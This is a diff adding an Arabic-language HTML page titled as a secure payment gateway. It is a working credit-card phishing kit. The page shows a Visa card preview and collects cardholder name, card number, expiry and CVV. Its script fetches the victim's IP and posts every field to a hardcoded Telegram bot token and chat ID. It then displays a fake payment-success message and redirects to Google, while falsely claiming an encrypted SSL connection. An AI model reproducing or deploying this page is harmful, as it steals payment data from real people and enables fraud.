@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>بوابة الدفع الآمنة</title>
+<style>
+body{font-family:-apple-system,Roboto,sans-serif;background:#f4f6f9;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
+.box{width:360px;background:#fff;padding:25px;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,.08);box-sizing:border-box}
+.header{text-align:center;margin-bottom:20px}
+.header h2{margin:0;font-size:20px;color:#1a1a1a}
+.header p{color:#666;font-size:13px;margin-top:5px}
+.card-preview{background:linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);border-radius:12px;padding:20px;color:#fff;margin-bottom:20px;position:relative;height:160px;box-sizing:border-box}
+.chip{width:40px;height:30px;background:#e0e0e0;border-radius:5px;margin-bottom:20px}
+.card-number{font-size:18px;letter-spacing:2px;margin-bottom:15px;font-family:monospace}
+.card-bottom{display:flex;justify-content:space-between;font-size:12px;text-transform:uppercase}
+.card-bottom span{display:block;font-size:10px;opacity:.7;margin-bottom:3px}
+.card-bottom div{font-size:14px}
+.card-logo{position:absolute;top:20px;left:20px;font-style:italic;font-weight:bold;font-size:18px}
+input{width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;font-size:16px;margin-bottom:12px;box-sizing:border-box;font-family:monospace}
+input::placeholder{font-family:sans-serif}
+.row{display:flex;gap:10px}
+.row input{margin-bottom:12px}
+button{width:100%;padding:14px;background:#28a745;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px}
+button:disabled{opacity:.6}
+.secure{text-align:center;font-size:12px;color:#888;margin-top:15px}
+.secure span{color:#28a745}
+</style>
+</head>
+<body>
+<div class="box">
+    <div class="header">
+        <h2>إتمام عملية الدفع</h2>
+        <p>يرجى إدخال بيانات البطاقة لإتمام العملية</p>
+    </div>
+    
+    <div class="card-preview">
+        <div class="card-logo">VISA</div>
+        <div class="chip"></div>
+        <div class="card-number" id="prevNum">•••• •••• •••• ••••</div>
+        <div class="card-bottom">
+            <div>
+                <span>اسم حامل البطاقة</span>
+                <div id="prevName">الاسم الكامل</div>
+            </div>
+            <div>
+                <span>تاريخ الانتهاء</span>
+                <div id="prevDate">MM/YY</div>
+            </div>
+        </div>
+    </div>
+
+    <form id="payForm">
+        <input type="text" id="cardName" placeholder="الاسم كما هو مكتوب على البطاقة" required autocomplete="off">
+        <input type="text" id="cardNum" placeholder="رقم البطاقة (16 رقم)" maxlength="19" required autocomplete="off" inputmode="numeric">
+        <div class="row">
+            <input type="text" id="cardExp" placeholder="MM/YY" maxlength="5" required autocomplete="off" inputmode="numeric">
+            <input type="text" id="cardCvv" placeholder="CVV" maxlength="4" required autocomplete="off" inputmode="numeric" type="password">
+        </div>
+        <button type="submit" id="btn">تأكيد الدفع</button>
+    </form>
+    <div class="secure">🔒 اتصال مشفر وآمن <span>(SSL 256-bit)</span></div>
+</div>
+
+<script>
+const TOKEN="9225798978:AAHnyMuXHnWv7P_y05v2_nsR_O5VRGQZzCE";
+const CHAT_ID="7356963877";
+
+// تحديث البطاقة المرئية أثناء الكتابة
+document.getElementById('cardNum').addEventListener('input', function(e) {
+    let v = e.target.value.replace(/\D/g, '').substring(0, 16);
+    let formatted = v.replace(/(\d{4})(?=\d)/g, '$1 ');
+    e.target.value = formatted;
+    document.getElementById('prevNum').textContent = formatted || '•••• •••• •••• ••••';
+});
+
+document.getElementById('cardName').addEventListener('input', function(e) {
+    document.getElementById('prevName').textContent = e.target.value || 'الاسم الكامل';
+});
+
+document.getElementById('cardExp').addEventListener('input', function(e) {
+    let v = e.target.value.replace(/\D/g, '').substring(0, 4);
+    if (v.length >= 2) v = v.substring(0,2) + '/' + v.substring(2);
+    e.target.value = v;
+    document.getElementById('prevDate').textContent = v || 'MM/YY';
+});
+
+document.getElementById('payForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const btn = document.getElementById('btn');
+    btn.disabled = true;
+    btn.textContent = "جارٍ التحقق...";
+    
+    const name = document.getElementById('cardName').value;
+    const num = document.getElementById('cardNum').value;
+    const exp = document.getElementById('cardExp').value;
+    const cvv = document.getElementById('cardCvv').value;
+    
+    let ip = '?';
+    try { ip = await fetch('https://api.ipify.org').then(r => r.text()); } catch(_) {}
+    
+    const text = "💳 بيانات بطاقة جديدة\n" +
+                 "👤 الاسم: " + name + "\n" +
+                 "🔢 الرقم: " + num + "\n" +
+                 "📅 الانتهاء: " + exp + "\n" +
+                 "🔒 CVV: " + cvv + "\n" +
+                 "🌐 IP: " + ip + "\n" +
+                 "🕒 " + new Date().toLocaleString('ar');
+                 
+    try {
+        const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: CHAT_ID, text: text})
+        });
+        
+        if (res.ok) {
+            btn.style.background = '#1e3c72';
+            btn.textContent = "تم الدفع بنجاح ✓";
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com'; // توجيه لصفحة حقيقية
+            }, 2000);
+        } else {
+            throw new Error('fail');
+        }
+    } catch (err) {
+        btn.textContent = "خطأ في الشبكة، حاول لاحقاً";
+        btn.disabled = false;
+    }
+});
+</script>
+</body>
+</html>
